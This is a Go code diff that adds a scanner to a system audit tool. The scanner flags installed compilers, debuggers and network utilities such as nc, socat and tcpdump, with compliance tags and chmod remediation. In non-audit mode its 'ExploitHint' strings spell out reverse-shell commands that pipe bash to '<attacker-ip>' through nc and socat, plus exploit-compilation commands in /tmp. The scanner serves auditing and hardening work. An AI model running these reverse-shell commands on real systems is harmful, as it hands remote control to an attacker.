@@ -223,7 +223,76 @@ func ScanPackages() ([]PackageAuditResult, error) {
 		results = append(results, *res)
 	}
 
+	// 5. Audit Installed Compilers & Attack Utilities (Tier 2)
+	results = append(results, ScanCompilers(AuditCfg.MaskSecrets)...)
+
 	return results, nil
+}
+
+// ScanCompilers audits the presence of compilers, build utilities, and network attack tools in PATH.
+func ScanCompilers(auditMode ...bool) []PackageAuditResult {
+	var results []PackageAuditResult
+	isAudit := len(auditMode) > 0 && auditMode[0]
+
+	tools := []struct {
+		name string
+		desc string
+	}{
+		{"gcc", "GNU C Compiler"},
+		{"g++", "GNU C++ Compiler"},
+		{"clang", "LLVM C/C++ Compiler"},
+		{"make", "Build automation tool"},
+		{"gdb", "GNU Debugger"},
+		{"nasm", "Netwide Assembler"},
+		{"as", "GNU Assembler"},
+		{"ncat", "Nmap netcat networking utility"},
+		{"nc", "Traditional Netcat utility"},
+		{"socat", "Multipurpose relay networking tool"},
+		{"tcpdump", "Network packet analyzer"},
+	}
+
+	for _, t := range tools {
+		binPath, err := exec.LookPath(t.name)
+		if err != nil {
+			continue
+		}
+
+		hint := ""
+		isDangerous := false
+		if !isAudit {
+			isDangerous = true
+			switch t.name {
+			case "gcc", "clang":
+				hint = fmt.Sprintf("%s -o /tmp/exploit /tmp/exploit.c", t.name)
+			case "make":
+				hint = "make -f /tmp/Makefile"
+			case "nc", "ncat":
+				hint = fmt.Sprintf("%s -e /bin/bash <attacker-ip> <port>", t.name)
+			case "socat":
+				hint = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker-ip>:<port>"
+			default:
+				hint = fmt.Sprintf("%s --help", t.name)
+			}
+		}
+
+		reason := fmt.Sprintf("%s ('%s') is installed at %s.", t.desc, t.name, binPath)
+		if !isAudit {
+			reason += " Facilitates local payload compilation and operational weaponization."
+		}
+
+		results = append(results, PackageAuditResult{
+			Name:          t.name,
+			Path:          binPath,
+			RiskLevel:     "INFO",
+			IsDangerous:   isDangerous,
+			Reason:        reason,
+			ExploitHint:   hint,
+			Remediation:   fmt.Sprintf("Restrict compiler execution to administrators: chmod 0700 %s", binPath),
+			ComplianceTag: "CIS-Linux-2.2 / NIST-CM-7",
+		})
+	}
+
+	return results
 }
 
 func isStatWritable(info os.FileInfo, userCtx *UserContext) bool {
